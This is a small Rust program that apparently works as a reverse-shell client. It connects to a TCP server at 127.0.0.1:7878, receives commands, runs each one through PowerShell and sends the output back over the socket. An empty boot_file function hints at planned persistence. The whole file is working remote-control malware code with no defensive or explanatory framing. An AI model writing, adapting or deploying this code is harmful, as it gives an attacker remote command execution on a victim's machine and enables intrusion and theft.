use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write, self};
use std::process::Command;

//V
fn main() {
    server_connect();
}

pub fn server_connect() {
	let mut stream = TcpStream::connect("127.0.0.1:7878").unwrap();
	
	loop {
	
		let mut buffer = [0; 1024];
		
		stream.read(&mut buffer).unwrap();
		let mut input = String::from_utf8_lossy(&buffer[..]).trim_matches(char::from(0)).to_string();

		println!("{}", input);

		let mut output = Command::new("powershell")
			.arg(input)
			.output()
			.expect("No");

		let s = io::stdout().write_all(&output.stdout).unwrap();
		stream.write_all(&output.stdout);
	}
}

pub fn boot_file() {

}
